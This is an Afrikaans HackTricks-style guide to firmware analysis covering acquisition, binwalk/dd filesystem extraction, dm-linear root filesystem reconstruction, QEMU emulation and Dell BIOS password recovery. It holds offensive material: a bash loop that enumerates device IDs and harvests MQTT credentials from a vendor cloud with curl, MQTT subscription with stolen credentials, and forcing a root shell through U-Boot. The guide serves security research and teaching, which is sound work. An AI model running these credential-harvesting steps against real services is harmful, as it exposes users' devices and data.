# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante bronne

Vir verkryging via blootgestelde hardeware-koppelvlakke, sien [Firmware-dumping met behulp van ’n UART-konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) en [SPI-flash-dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Vir ’n herhaalbare UART-vaslegging tydens opstart voordat toegang tot die konsole verkry word, sien [SCPI-beheerde krag- en ossilloskoopverkryging](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel vanaf die oomblik dat dit aangeskakel word toegang tot belangrike instruksies het en die bedryfstelsel kan begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om te verstaan waaruit ’n toestel bestaan en watter tegnologieë dit gebruik. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel wat daarop loop
- Besonderhede oor die selflaaiprogram
- Hardeware-uitleg en datablaaie
- Maatstawwe vir die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsevaluerings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels onontbeerlik, net soos die ontleding van enige beskikbare open-source sagtewarekomponente deur middel van handmatige en outomatiese hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle se LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met ’n eie kompleksiteitsvlak:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit **te bou** volgens die verskafte instruksies
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om gehoste firmwarelêers te vind
- Deur direk toegang tot **wolkberging** te verkry met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit uit die toestel te **onttrek** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur binne toestelkommunikasie na opdateringsversoeke te **snuffel**
- Deur **hardgekodeerde opdaterings-eindpunte** te identifiseer en te gebruik
- Deur dit vanaf die selflaaiprogram of netwerk te **dump**
- Deur die stoorskyfie te **verwyder en uit te lees** wanneer niks anders werk nie, met behulp van geskikte hardeware-nutsmiddels

### Slegs UART-logboeke: dwing ’n root-shell af via U-Boot-omgewing in flash

As UART RX geïgnoreer word (slegs logboeke), kan jy steeds ’n init-shell afdwing deur die **U-Boot-omgewingsblob** vanlyn te **wysig**:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-knip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob opnieuw**.
3. Flits slegs die env-partisie weer en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaaiprogram se shell gedeaktiveer is, maar die env-partisie via eksterne flashtoegang skryfbaar is.

## Firmware ontleed

Noudat jy **die firmware het**, moet jy inligting daaruit onttrek om te weet hoe om dit te hanteer. Hier is verskillende nutsmiddels wat jy daarvoor kan gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsmiddels vind nie, gaan die **entropie** van die beeld na met `binwalk -E <bin>`. As die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsmiddels gebruik om **lêers wat in die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of gebruik [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Rou vertoonbates in eksterne flash

'n Eksterne SPI-dump is nie noodwendig die MCU se uitvoerbare firmware nie. Vergelyk vir 'n Cortex-M-teiken die begin van elke kandidaat-kodegebied met die toestel se geheuekaart: 'n normale vektortabel begin met 'n geloofwaardige SRAM-stapelwyser en 'n reset-handler-adres in uitvoerbare geheue. Die afwesigheid van 'n vektortabel by offset nul bewys op sigself nie dat die hele chip geen kode bevat nie; inspekteer ander offsets en die opstartuitleg. As `binwalk` geen houer vind nie, inspekteer rou grepe en bring flash-leesadresse van 'n [gedekodeerde SPI-opname](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) in verband met aksies wat nuwe skerms laai.<sup>[[14]](#references)</sup>

Probeer vir 'n vertoonbategebied verskillende kandidaat-pixel-formate en afmetings, eerder as om PNG/JPEG te veronderstel. Die aangehaalde toestel het **80×160 RGB565 little-endian**-rame gebruik: teen twee grepe per pixel is 'n raam **25,600 bytes** (25 KiB), nie 24 kilobits nie. 'n Gedekodeerde flash-leesadres het die offset van die skermbate aangedui; die navorser het 'n voorbereide beeld omgeskakel met `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, die bate van dieselfde grootte in die oorspronklike dump vervang, dit geskryf met `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, en die nuwe beeld op die skerm bevestig. Dit demonstreer skryfbare *eksterne vertoonbates*, nie die onttrekking of herflitsing van die MCU se interne firmware nie. Bewaar die oorspronklike dump en verifieer die afmetings, bytevolgorde, offset en lengte van die vervanging voordat jy skryf.<sup>[[14]](#references)</sup>

### Differensiële flash-analise en herstelbare XOR-geheime stoorplekke

Wanneer 'n firmware-instelling geen gedokumenteerde stoorformaat het nie, neem eers verskeie ooreenstemmende flash-lesings, verander **presies een** instelling, dump die volledige chip weer en vergelyk die offsets. Deur die eksperiment met beheerde waardes te herhaal, kan jy die instelling van tellers en skryfmetadata onderskei; veranderinge by nuwe offsets eerder as in plek dui op 'n slegs-byvoegende of loggestruktureerde stoorplek. Bewaar geskrapte/tombstone-inskrywings, want hul loonvraggrepe kan dalk herstel word.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nadat jy die streek opgespoor het, onttrek die firmware-modules met nutsmiddels soos `binwalk` en reverse-engineer die skrywer/valideerder in Ghidra. Bevestig veldgrense, opvulling, sleutelindeksering en sleutelafleiding in die kode, eerder as om die skema slegs uit patrone in die ciphertext af te lei.<sup>[[12]](#references)</sup>

#### Herwin sleutels uit geënkripteerde nul-opvulling

Soos beskryf in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), verklap bekende plaintext die keystream-grepe by dieselfde afwykings. ’n Veld met ’n vaste grootte is besonder blootgestel wanneer sy nul-opvulling elke indeks van ’n herhalende XOR-sleutel dek: die geënkripteerde opvulling verklap daardie sleutelgrepe direk omdat `0x00 XOR key_byte = key_byte`. As elke sleutelindeks gedek word, rekonstrueer die sleutel uit die ciphertext-stert en dekripteer die ingevulde grepe.<sup>[[12]](#references)</sup>

Dell se kwesbare DVAR BIOS-wagwoordformaat is ’n konkrete voorbeeld: greep `0` van ’n 32-greep-veld is plaintext, terwyl grepe `1..31` ’n herhalende sleutel van 20 grepe gebruik.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Vir ’n wagwoordlengte `L` was posisies `L..31` nul voor XOR. Wanneer `L <= 12`, dek daardie posisies elke sleutelindeks, dus word die volledige sleutel en wagwoord sonder brute force herwin:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Lei sleutels uit historiese rekords af

Moenie elke rekord afsonderlik ontleed nie. Die DVAR-sleutel word ongeveer afgelei as `modified_md5(device_seed || variable_GUID || password[0])`: die device seed en GUID is vas, en die enigste wagwoordafhanklike invoer is die eerste byte in cleartext. Dit gee hoogstens 256 sleutels per toestel, en rekords wat met dieselfde byte begin, deel dus ’n sleutel. Groepeer aktiewe en geskrapte rekords volgens daardie byte; ’n kort historiese rekord kan die volle sleutel deur padding lek en ’n huidige, langer rekord dekripteer waarvan die eie padding onvoldoende is. Wagwoordrotasie kan dus blootstelling verhoog wanneer ou ciphertext getombstone word eerder as uitgevee.<sup>[[12]](#references)</sup>

Die [`dellpwn`](https://github.com/R3n5k1/dellpwn)-nutsding spoor DVAR op, valideer kandidaat-rekords, herwin wagwoorde en kan rou gestoorde/sleutelbytes vertoon. Bou dit vanuit ’n checkout en skandeer ’n geverifieerde flash-beeld soos volg:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Vir pasgemaakte parsers, verwerp false positives met rekordstruktuur, beperkings op drukbare karakters, kontroles vir nulvulling, sleutelentropie en konsekwentheid waar die sleutel omvou. As herhaalde dumps yl biswisselings per skryfbewerking toon, lys die waargenome maskers en rangskik moontlike regstellings volgens hierdie beperkings, maar rapporteer dubbelsinnige karakters in plaas daarvan om heuristiese uitvoer as presiese herstel voor te stel.<sup>[[12]](#references)</sup>

Wagwoordverifiers behoort ’n gesoute, herhaalde eenrigtinghash te stoor eerder as omkeerbare ciphertext, en log-gestruktureerde bergings behoort verouderde geheime materiaal veilig te verwyder.<sup>[[12]](#references)</sup>

### Die lêerstelsel bekom

Met die vorige kommentaar-van-voorsiene nutsmiddels soos `binwalk -ev <bin>` behoort jy die **lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **lêergids wat na die lêerstelseltipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelselonttrekking

Soms het binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge nie**. Gebruik in hierdie gevalle binwalk om **die offset van die lêerstelsel te vind en die saamgeperste lêerstelsel** uit die binêre lêer te carve, en **onttrek** die lêerstelsel dan **handmatig** volgens die tipe daarvan met behulp van die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd command** uit om die Squashfs-lêerstelsel te carve.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (in die voorbeeld hierbo gebruik)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die gids "`squashfs-root`" wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Herbou van gesplete ingebedde root-lêerstelsels

As ’n rou eMMC/SSD-dump ’n geldige lêerstelselkopschrift bevat, maar die metadata-offsets buite die nominale partisie strek, moet dit nie onmiddellik as korrup geklassifiseer word nie. Ingebedde selflaaikode kan die werklike root-toestel uit verskeie fisiese reekse saamstel met Device Mapper, dus lewer die carving van een GPT-partisie slegs die eerste segment op.<sup>[[9]](#references)</sup>

#### Triage van die volledige mediabeeld

Verifieer eers dat die verkryging voltooi is, die grootte stabiel is en geen skrywer steeds die beeld gebruik nie. As die lêernaam ’n begin-/eindadres kodeer, vergelyk daardie reeks met die werklike aantal grepe. Herstel die GPT in leesalleenmodus en koppel slegs die vereiste reeks; moenie `vgchange -ay` teen ’n onvertroude fisiese volume op die werkstasie uitvoer nie, aangesien volume-groepbotsings en onbedoelde skryfbewerkings moontlik is.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Gebruik verkieslik ’n weggooibare VM wanneer die oorspronklike init-logika of ’n LVM-stapel die volledige image moet kan sien. Historiese bootlogs van ’n standaard boot partition is besonder nuttig: die bootloader het moontlik proprietary-container-offsets, komponentlengtes, slotkeuse, alignment-reëls en signature-verifikasie aangeteken. Gebruik dié waardes om ’n ingebedde command line, kernel en initramfs uit te sny, en valideer dan elke uitvoer afsonderlik met `file`, magic bytes en `binwalk`; as jy tot aan die einde van die container lees, kan jy per ongeluk ’n initrd, ACPI-object of signature agteraan die kernel byvoeg.<sup>[[9]](#references)</sup>

#### Herwin die boot-time-blokkaart

Onttrek die kernel se initramfs en reverse-engineer sy `/init` en enige storage libraries. Volg in [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) stringverwysings vir `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` en partition-paaie; spoor dan die kode na wat die aktiewe A/B-slot kies en die tabel opstel. Nuttige beginpunte in radare2 is `r2 -A init`, `afl`, `pdf @ main` en `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Die linear target karteer opeenvolgende reekse van ’n virtuele toestel na reekse op een of meer backing devices. ’n Herwonne tabel met twee segmente het dikwels hierdie vorm (alle posisies en lengtes is 512-byte-sektore):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reproduseer die masjienkode-aritmetiek presies, insluitend heelgetalwydte, verskuiwings en eenheidsomskakelings. Byvoorbeeld, die volgende uitdrukking rond ’n grepegrootte af na ’n 4-KiB-grens en skakel dit eers daarna om na 512-greepsektore; as jy dit vervang met `p4_bytes // 512`, verskuif die gekose stert met `p4_bytes % 4096` wanneer die partisie nie op ’n bladsygrens belyn is nie.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstrueer ’n plat analisebeeld deur die reekse in tabelvolgorde met begrensde stukke te kopieer, eerder as om die volledige mediadump in die geheue te laai. Dit vermy ook die skep van mapper-toestelle aan die gasheerkant. Hou die GPT-afgeleide afsetwaardes, omgekeerde sektortellings en die gevolglike uitvoerlengte as afsonderlike bewerings.<sup>[[9]](#references)</sup>

#### Onderskei korrupsie van ’n konstante rekonstruksiefout

Vir SquashFS, kontroleer die `hsqs`-magic en dekodeer die little-endian 64-bis-veld `bytes_used` by superblokafset 40 voordat jy `unsquashfs` laat loop. As ekstraksie in verskeie onverwante strukture misluk, deursoek ’n breë venster rondom die verwagte posisies en vereis sterk strukturele kandidate: ’n dekomprimeerbare metadata-blok, verskeie opeenvolgende geldige gidsinskrywings, geloofwaardige inode-velde, ’n wortelinode wat met die inode-telling ooreenstem, of ’n geldige integriteitsmetadatastruktuur. ’n Enkele magic-treffer is onvoldoende.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wanneer dieselfde getekende delta onafhanklike strukture geldig maak—byvoorbeeld gidsmetadata en ’n verity-rekord—is die waarskynlike oorsaak ’n sistematiese fout in die segmentbegin, eerder as ontbrekende grepe. Gaan terug na die omgekeerde rekenwerk en soek na weggegooide reswaardes, getekendheid, oorloop of sektor-/bladsyafronding voordat jy probeer om weesdata te herstel of lêerstelselmetadata te regstel.<sup>[[9]](#references)</sup>

Hou laastens die beskermingsgrense apart: TPM-verseëlde LUKS-volumes beskerm datavertroulikheid, terwyl ’n getekende dm-verity-kartering die integriteit van die wortellêerstelsel beskerm. ’n Sagteware-TPM kan nie ’n sleutel herstel wat aan die oorspronklike fisiese TPM verseël is nie, en om ’n gewysigde SquashFS te begin via ’n navorsingsuitsluitlike init wat verity-verifikasie weglaat, vervals nie die handtekening daarvan of omseil dm-verity nie.<sup>[[9]](#references)</sup>

## Ontleding van Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsmiddels om die firmwarebeeld te ontleed en waardevolle data daaruit te onttrek.

### Aanvanklike ontledingsnutsmiddels

’n Stel opdragte word gegee vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, stringe te onttrek, binêre data te ontleed en die partisie- en lêerstelselbesonderhede te verstaan:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die image te bepaal, word die **entropie** met `binwalk -E <bin>` nagegaan. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word gereedskap en bronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe kan herken nie omdat magic bytes ontbreek, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset te vind, gevolg deur die `dd`-opdrag om die lêerstelsel uit te kerf:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig te onttrek, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel onttrek is, begin die soektog na sekuriteitsfoute. Daar word gelet op onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-eindpunte, funksionaliteit van opdateringsbedieners, ongekompileerde kode, opstartskripte en gekompileerde binaries vir aflynontleding.

**Belangrike liggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel te ontdek:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitstoetse vir gekompileerde binaries

Beide bronkode en gekompileerde binaries wat in die lêerstelsel gevind word, moet vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Oes van cloud-konfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie van ’n cloud-eindpunt af wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy ontdek dat `<token>` plaaslik van die toestel-ID afgelei word deur ’n hardgekodeerde geheim te gebruik, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY ken in staat om die URL te rekonstrueer en die cloud-konfigurasie af te laai, wat dikwels leesbare MQTT-geloofsbriewe en onderwerpvoorvoegsels blootlê.

Praktiese werkvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) aan en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres vertoon, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel wolkkonfigurasie en MQTT-aanmeldbewyse

- Stel die URL saam en haal JSON met curl op; ontleed dit met jq om geheime uit te haal:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics in te teken en soek na sensitiewe gebeurtenisse:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumereer voorspelbare device-ID's (op skaal, met toestemming)

- Baie ekosisteme sluit verskaffer-OUI-/produk-/tipegrepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's itereer, tokens aflei en konfigurasies programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Aantekeninge
- Verkry altyd uitdruklike toestemming voordat jy mass enumeration probeer.
- Verkies emulering of statiese analise om geheime te herwin sonder om teikenhardeware te wysig, waar moontlik.

Die proses om firmware te emuleer, maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede teëkom, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en bytevolgorde, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Wanneer jy enkele programme ondersoek, is dit noodsaaklik om die program se bytevolgorde en SVE-argitektuur te bepaal.

#### Voorbeeld met MIPS-argitektuur

Om ’n binary vir die MIPS-argitektuur te emuleer, kan jy die volgende opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die gepaste keuse.

#### ARM-argitektuuremulasie

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander fasiliteer volledige firmware-emulasie deur die proses te outomatiseer en met dinamiese analise te help.

### Herbou van gesplete en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar inode-, gids- of fragmenttabel-offsets onmoontlik lyk, moenie `unsquashfs` onmiddellik lap nie. Reverse engineer die vroeë selflaaibinary en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel bou met ’n `dm-linear`-kartering wat sektore wat by ’n ander partisie geleen is, byvoeg. Kontroles wat net die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[11]](#references)</sup>

Behou die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in die oorspronklike volgorde; en hou rekening met bankafhanklike stertstreke in A/B-uitlegte. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat dan in 512-greep-sektore uit; as jy dit met `partition_bytes // 512` vervang, kan die bygevoegde omvang met ’n paar kilogrepe verskuif en al die daaropvolgende SquashFS-tabelle beskadig.<sup>[[11]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[11]](#references)</sup>

1. Herwin elke `dm-linear`-segment se brontoestel, beginsektor en lengte uit die verifier/init-binary.
2. Voeg die omvangs saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As ekstraksie steeds misluk, soek slegs binne ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n aanneemlike superblok te aanvaar.
4. Voer ’n onveranderde `unsquashfs` teen die herboude image uit; suksesvolle deurloop van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Vervanging van dm-verity wat deur die ontleder beheer word

Wanneer die ontleder die QEMU-kernel, initramfs en virtuele skywe beheer, kan ’n gewysigde wortel selflaai word deur die verskaffer se verifikasie-PID 1 met ’n klein staties gelinkte init te vervang. Dit is ’n **laboratoriumvervanging van die selflaaiketting**, nie ’n omseiling van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangingsinit behoort die operasionele dele van die oorspronklike selflaaipad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywings 0–2, monteer `/proc` en `/sys`, wag vir die verskafde bloktoestel, monteer die geredigeerde wortel as leesalleen, ontkoppel die pseudo-lêerstelsels van die ou wortel, skuif die nuwe montering na `/`, voer `chroot` uit en roep `execve()` aan om die firmware se oorspronklike `/sbin/init` uit te voer. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat monteringspunte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderlike toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou terwyl ’n tweede leesalleen virtio-skyf die geredigeerde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van vanlyn beeldtoestand

